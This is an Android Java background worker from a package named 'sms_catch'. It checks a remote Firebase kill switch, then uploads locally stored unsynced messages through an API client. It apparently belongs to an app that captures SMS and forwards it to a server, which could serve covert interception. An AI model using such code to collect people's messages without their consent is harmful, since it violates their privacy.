package com.qbitspark.sms_catch;

import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;


import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class SyncWorker extends Worker {
    private static final String TAG = "SyncWorker";
    private boolean isAppEnabled = true;

    public SyncWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        Log.d(TAG, "Starting sync worker");

        try {
            // 1. First check kill switch status (blocking call)
            Boolean isDisabled = checkKillSwitchStatus();

            if (isDisabled == null) {
                Log.w(TAG, "Couldn't determine kill switch status - proceeding with sync");
            } else if (isDisabled) {
                Log.w(TAG, "App is disabled by kill switch - aborting sync");
                return Result.success(); // Return success to avoid retries
            }

            // 2. Proceed with normal sync if app is enabled
            MessageDatabase database = MessageDatabase.getInstance(getApplicationContext());
            List<MessageData> unsyncedMessages = database.messageDao().getUnsyncedMessages();

            Log.d(TAG, "Found " + unsyncedMessages.size() + " unsynced messages");

            for (MessageData message : unsyncedMessages) {
                ApiClient.sendMessage(getApplicationContext(), message);
            }

            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "Error in sync worker: " + e.getMessage());
            return Result.retry();
        }
    }

    private Boolean checkKillSwitchStatus() throws InterruptedException {
        final CountDownLatch latch = new CountDownLatch(1);
        final Boolean[] isDisabled = {null};

        FirebaseDatabase.getInstance()
                .getReference("killSwitchEnabled")
                .addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        isDisabled[0] = snapshot.getValue(Boolean.class);
                        latch.countDown();
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {
                        Log.e(TAG, "Kill switch check failed", error.toException());
                        latch.countDown();
                    }
                });

        latch.await(5, TimeUnit.SECONDS);
        return isDisabled[0];
    }


    public boolean isAppEnabled() {
        return isAppEnabled;
    }
}